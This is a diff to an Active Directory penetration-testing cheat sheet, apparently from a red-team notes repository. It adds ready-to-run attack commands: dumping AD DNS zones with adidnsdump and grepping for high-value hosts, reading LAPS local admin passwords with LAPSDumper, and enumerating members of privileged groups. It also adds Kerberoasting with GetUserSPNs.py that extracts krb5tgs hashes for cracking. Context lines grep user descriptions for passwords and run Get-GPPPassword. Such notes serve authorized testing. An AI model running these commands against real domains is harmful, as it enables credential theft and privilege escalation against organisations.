@@ -126,6 +126,27 @@ cut -f1 -d" " trusts.txt > $zcase"_trusts_clean.txt"
 for i in `cat $zcase"_trusts_clean.txt"`; do ping -a $i; done
 ```
 
+### <a name='shoot-dom'></a>shoot-dns
+```sh
+# https://github.com/dirkjanm/adidnsdump
+# https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/
+
+# get DNS zones
+adidnsdump -u $zdom"\\"$ztarg_user_name --print-zones $zdom_dc_fqdn
+
+# get zone content, generate 'results.csv' in the current dir
+adidnsdump -u $zdom"\\"$ztarg_user_name --zone $zdom_fqdn $zdom_dc_fqdn
+
+# keywords per target
+vcenter hyper adm docker ilo pam vdi vault
+webcam print prt share file nfs cifs ftp ldap
+kibana elastic sql db hadoop splunk siem qradar
+sap crm
+grep "A," records.csv | grep -i $keyword 
+
+
+```
+
 ### <a name='shoot-dom'></a>shoot-dom
 
 #### <a name='shoot-dcs'></a>shoot-dcs
@@ -157,6 +178,12 @@ nbtscan -r 10.0.0.0/24
 ```sh
 cme ldap -u $ztarg_user_name -p $ztarg_user_pass -kdcHost $zdom_dc_fqdn -d $zdom_fqdn -M get-desc-users > $zcase"_cme_ldap_get-desc-users.txt"
 grep -i "pass|pw|=" $zcase"_cme_ldap_get-desc-users.txt"
+```
+
+#### <a name='shoot-desc-users'></a>shoot-laps
+```sh
+# https://github.com/n00py/LAPSDumper
+python laps.py -u $ztarg_user_name -p $ztarg_user_pass -d $zdom_fqdn
 ```
 
 #### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
@@ -199,12 +226,19 @@ References :
 
 ```sh
 # privileged group
+ztarg_group_name="Administrators"; ztarg_group_nick="adm"
 ztarg_group_name="Backup Operators"; ztarg_group_nick="bo"
+ztarg_group_name="Cert Publishers"; ztarg_group_nick="cp"
+ztarg_group_name="DHCP Administrators"; ztarg_group_nick="dhcp"
 ztarg_group_name="DNSAdmins"; ztarg_group_nick="dns"
-ztarg_group_name="Enterprise Admins"; ztarg_group_nick="ea"
-ztarg_group_name="Group Policy Creator Owners"; ztarg_group_nick="gpco"
-ztarg_group_name="Remote Desktop Users"; ztarg_group_nick="rdp"
 ztarg_group_name="Domain Admins"; ztarg_group_nick="da"
+ztarg_group_name="Enterprise Admins"; ztarg_group_nick="ea"
+ztarg_group_name="Event Log Readers"; ztarg_group_nick="elogr"
+ztarg_group_name="Group Policy Creator Owners"; ztarg_group_nick="gpco"
+ztarg_group_name="Hyper-V administrators"; ztarg_group_nick="hyperv"
+ztarg_group_name="network configuration operators"; ztarg_group_nick="netconf"
+ztarg_group_name="Remote Desktop Users"; ztarg_group_nick="rdp"
+ztarg_group_name="Server operators"; ztarg_group_nick="so"
 echo $ztarg_group_name; pywerview.py get-netgroupmember -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip -r > "$zcase""_get-netgroupmember_""$ztarg_group_nick"".txt"
 
 # list the samaccountname
@@ -252,10 +286,11 @@ Get-GPPPassword.py $zz@$zdom_dc_ip
 #### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
 
 #### <a name='shoot-spns'></a>shoot-spns
-```
+```sh
 # https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
-GetUserSPNs.py $zdom_fqdn/$ztarg_user_name -k -no-pass -dc-ip $zdom_dc_ip -request >> tgs.txt
-GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> tgs.txt
+GetUserSPNs.py $zdom_fqdn/$ztarg_user_name -k -no-pass -dc-ip $zdom_dc_ip -request >> getuserspns_$zdom_dc".data"
+GetUserSPNs.py $zz -dc-ip $zdom_dc_ip -request >> getuserspns_$zdom_dc".data"
+grep "krb5tgs" getuserspns_$zdom_dc".data" > getuserspns_$zdom_dc".tgs"
 ```
 
 #### <a name='shoot-npusers'></a>shoot-npusers
